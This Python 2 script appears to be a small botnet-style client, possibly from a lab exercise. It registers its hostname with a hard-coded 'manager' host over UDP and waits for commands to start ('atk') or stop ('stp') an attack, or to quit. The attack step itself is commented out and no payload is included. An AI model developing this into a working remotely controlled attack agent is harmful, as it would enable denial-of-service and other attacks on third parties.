import errno
import threading
from socket import *
serverName = 'DESKTOP-OOVUV0L'
serverPort = 12000
clientSocket = socket(AF_INET, SOCK_DGRAM)

clientSocket.sendto('cli'+gethostname(),(serverName, serverPort)) 
server = ('', 0)
ATACANDO = False

def ThreadEnvio():
    ATACANDO = False
    while True:
        try:
            rcv, serverAddress = clientSocket.recvfrom(2048) 
        except error, e:
            rcv = ''
            if e[0] == 10054:
                print 'Gerente desconectado'
                continue

        print rcv 

        if rcv == 'atk':
            if(ATACANDO == True):
                print  'ja estou atacando'
            #execfile(Ataque.py)
            ATACANDO = True

        if rcv == 'stp':
            if(ATACANDO == False):
                print 'nao estou atacando'
            ATACANDO = False

        if rcv == 'acc':
            print 'Conectado ao gerente'

        if rcv == 'rem':
            raise SystemExit


        #clientSocket.close()

try:
    thread = threading.Thread(target = ThreadEnvio, args=())
    thread.daemon = True 
    thread.start();
    while thread.isAlive(): 
        thread.join(1)

except KeyboardInterrupt, SystemExit:
    print 'fim'
    clientSocket.sendto('off'+gethostname(), (serverName, serverPort))       

    exit(0)

